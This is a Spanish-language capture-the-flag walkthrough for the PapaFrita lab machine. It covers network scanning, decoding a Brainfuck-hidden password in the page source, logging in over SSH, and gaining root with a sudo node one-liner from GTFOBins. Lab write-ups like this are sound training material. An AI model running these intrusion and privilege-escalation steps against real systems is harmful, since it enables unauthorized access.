# PapaFrita

Maquinas que vamos a utilizar Kali Linux y PapaFrita  [https://thehackerslabs.com/papafrita/](https://thehackerslabs.com/papafrita/)

```bash
sudo arp-scan -I eth0 --localnet
```

![image.png](./imagenes/image%2086.png)

```bash
nmap -p- -sS -sV -sC --open -min-rate=2000 -n -vvv -Pn 10.0.3.30
```

![image.png](./imagenes/image%2087.png)

- Miramos lo que corre dentro del puerto 80 en el navegador web
    
    ![image.png](./imagenes/d8fbbd25-60d9-4c89-ac95-74ac20575f86.png)
    
    A simple vista no hay nada interesante pero vamos a revisar el código fuente.
    
    `CTRL+Z`
    
    ![image.png](./imagenes/image%2088.png)
    
    Nos encontramos estas curiosas lineas que parecen estar escrito en **Brainfuck** por tanto vamos a intentar descodificar el codigo .
    
- Voy a usar la web [https://www.dcode.fr/](./imagenes/https://www.dcode.fr/) para intentar desentrañar el código.
    
    ![image.png](./imagenes/image%2089.png)
    
    `abuelacalientalasopa` Parece una contraseña
    

- Probando distintos nombres de usuario nos vamos por la opción más lógica. Y elegimos de usuario **abuela para el SSH.**
    
    ```bash
    ssh [abuela@10.0.3.30](./imagenes/mailto:abuela@10.0.3.30)
    ```
    
    ![image.png](./imagenes/image%2090.png)
    
- Listamos privilegios para ver los permisos **sudo -l**
    
    `sudo -l`
    
    ![image.png](./imagenes/image%2091.png)
    
- Usamos [https://gtfobins.github.io/](./imagenes/https://gtfobins.github.io/)
    
    ![image.png](./imagenes/image%2092.png)
    

`sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'`

`whoami`

![image.png](./imagenes/image%2093.png)
